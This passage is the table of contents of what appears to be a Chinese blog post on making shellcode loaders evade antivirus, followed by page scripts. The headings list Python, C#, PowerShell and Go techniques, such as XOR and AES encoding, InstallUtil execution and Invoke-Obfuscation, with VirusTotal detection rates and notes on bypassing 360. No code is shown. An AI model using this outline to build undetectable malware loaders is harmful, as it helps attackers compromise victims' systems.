href="#2-python%EF%BC%88%E6%96%87%E4%BB%B6%E6%AF%94%E8%BE%83%E5%A4%A7%EF%BC%8C%E4%B8%8D%E5%90%88%E9%80%82%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">2.python（文件比较大，不合适）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E9%80%9A%E8%BF%87py%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91exe"><span class="toc-number">2.1.</span> <span class="toc-text">1  通过py源码编译exe</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-python%E5%8A%A0%E8%BD%BDC%E4%BB%A3%E7%A0%81%EF%BC%88VT-8-69-%E8%BF%87360%EF%BC%89"><span class="toc-number">2.1.1.</span> <span class="toc-text">1.python加载C代码（VT:8&#x2F;69 过360）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-py2exe%E6%89%93%E5%8C%85%E7%BC%96%E8%AF%91exe-VT-6-70-%E8%BF%87360-%E8%9C%9C%E6%B1%81%E9%97%AA%E9%80%80%EF%BC%9F%EF%BC%9F%EF%BC%9F%E4%BC%9A%E5%BC%B9%E9%BB%91%E6%A1%86%E4%B8%8D%E5%BB%BA%E8%AE%AE%E4%BD%BF%E7%94%A8"><span class="toc-number">2.1.2.</span> <span class="toc-text">2.py2exe打包编译exe(VT: 6&#x2F;70 过360 蜜汁闪退？？？会弹黑框不建议使用)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-base64%E7%BC%96%E7%A0%81-%E5%A4%B1%E8%B4%A5%E3%80%82%E3%80%82%E3%80%82"><span class="toc-number">2.1.3.</span> <span class="toc-text">3.base64编码(失败。。。)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-py-C%E7%BC%96%E8%AF%91exe-%E5%A4%B1%E8%B4%A5%E3%80%82%E3%80%82"><span class="toc-number">2.1.4.</span> <span class="toc-text">4.py+C编译exe(失败。。)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-xor%E5%8A%A0%E5%AF%86%EF%BC%88%E5%A4%B1%E8%B4%A5%E3%80%82%E3%80%82%EF%BC%89"><span class="toc-number">2.1.5.</span> <span class="toc-text">5.xor加密（失败。。）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-aes%E5%8A%A0%E5%AF%86"><span class="toc-number">2.1.6.</span> <span class="toc-text">6.aes加密</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-python%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-number">2.2.</span> <span class="toc-text">2.python加载器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-HEX%E5%8A%A0%E5%AF%86"><span class="toc-number">2.2.1.</span> <span class="toc-text">1.HEX加密</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-base64%E5%8A%A0%E5%AF%86"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.base64加密</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-c-%EF%BC%88%E6%9F%A5%E6%9D%80%E6%A6%82%E7%8E%87%E4%BB%8D%E7%84%B6%E6%AF%94%E8%BE%83%E5%A4%A7%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">3.c#（查杀概率仍然比较大）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-C-%E6%BA%90%E7%A0%81%E7%9B%B4%E6%8E%A5%E7%BC%96%E8%AF%91exe"><span class="toc-number">3.1.</span> <span class="toc-text">1.C#源码直接编译exe</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-C-shellcode%E7%9B%B4%E6%8E%A5%E7%BC%96%E8%AF%91%EF%BC%88VT-16-69-%E8%BF%87360%EF%BC%89"><span class="toc-number">3.1.1.</span> <span class="toc-text">1.C#+shellcode直接编译（VT:16&#x2F;69 过360）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-C-%E5%8A%A0%E5%AF%86%E5%A4%84%E7%90%86shellcode%E5%85%8D%E6%9D%80"><span class="toc-number">3.1.2.</span> <span class="toc-text">2.C#+加密处理shellcode免杀</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-XOR-AES%E7%BC%96%E7%A0%81shellcode"><span class="toc-number">3.1.3.</span> <span class="toc-text">3.XOR&#x2F;AES编码shellcode</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%8A%A0%E8%BD%BDC-%E4%BB%A3%E7%A0%81"><span class="toc-number">3.2.</span> <span class="toc-text">2.加载器加载C#代码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8CSC-InstallUtil%E6%89%A7%E8%A1%8Cshellcode%EF%BC%88VT-37-71-shell-exe%E4%B8%8D%E8%83%BD%E8%BF%87360%EF%BC%89"><span class="toc-number">3.2.1.</span> <span class="toc-text">1.使用CSC+InstallUtil执行shellcode（VT:37&#x2F;71  shell.exe不能过360）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E4%BB%8E%E8%B5%84%E6%BA%90%E9%87%8C%E5%8A%A0%E8%BD%BDshelllcode"><span class="toc-number">3.2.2.</span> <span class="toc-text">2.从资源里加载shelllcode</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-powershell"><span class="toc-number">4.</span> <span class="toc-text">4.powershell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">4.1.</span> <span class="toc-text">1.基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-powershell%E7%89%88%E6%9C%AC%E9%97%AE%E9%A2%98"><span class="toc-number">4.1.1.</span> <span class="toc-text">1.powershell版本问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%B8%B8%E8%A7%81%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8F"><span class="toc-number">4.1.2.</span> <span class="toc-text">2.常见执行方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%89%A7%E8%A1%8C%E7%AD%96%E7%95%A5"><span class="toc-number">4.1.3.</span> <span class="toc-text">3.执行策略</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-powershell%E5%8A%A0%E8%BD%BDshellcode%E6%96%B9%E6%B3%95"><span class="toc-number">4.2.</span> <span class="toc-text">2.powershell加载shellcode方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-msf-ps1%E6%9C%AC%E5%9C%B0%E6%89%A7%E8%A1%8C-VT-20-59-%E8%BF%87360"><span class="toc-number">4.2.1.</span> <span class="toc-text">1.msf-ps1本地执行(VT:20&#x2F;59 过360)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-Invoke-Shellcode%E5%8A%A0%E8%BD%BD%EF%BC%88VT-shell-ps1-0-59%EF%BC%89"><span class="toc-number">4.2.2.</span> <span class="toc-text">2.Invoke-Shellcode加载（VT:shell.ps1-0&#x2F;59）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-Invoke-Obfuscation%E5%AF%B9ps1%E5%85%8D%E6%9D%80-VT-4-58"><span class="toc-number">4.2.3.</span> <span class="toc-text">3.Invoke-Obfuscation对ps1免杀	(VT:4&#x2F;58)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-ps1%E8%A1%8C%E4%B8%BA%E5%85%8D%E6%9D%80"><span class="toc-number">4.2.4.</span> <span class="toc-text">4.ps1行为免杀</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-go"><span class="toc-number">5.</span> <span class="toc-text">5.go</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Go%E5%B5%8C%E5%85%A5shellcode"><span class="toc-number">5.1.</span> <span class="toc-text">1.Go嵌入shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Go%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-number">5.2.</span> <span class="toc-text">2.Go加载器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-go-shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8-VT%E6%9F%A5%E6%9D%80%E7%8E%874-69"><span class="toc-number">5.2.1.</span> <span class="toc-text">1.go-shellcode加载器(VT查杀率4&#x2F;69)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-gsl%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-number">5.2.2.</span> <span class="toc-text">2.gsl加载器</span></a></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background: #FFFFFF"><div id="footer-wrap"></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">簡</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>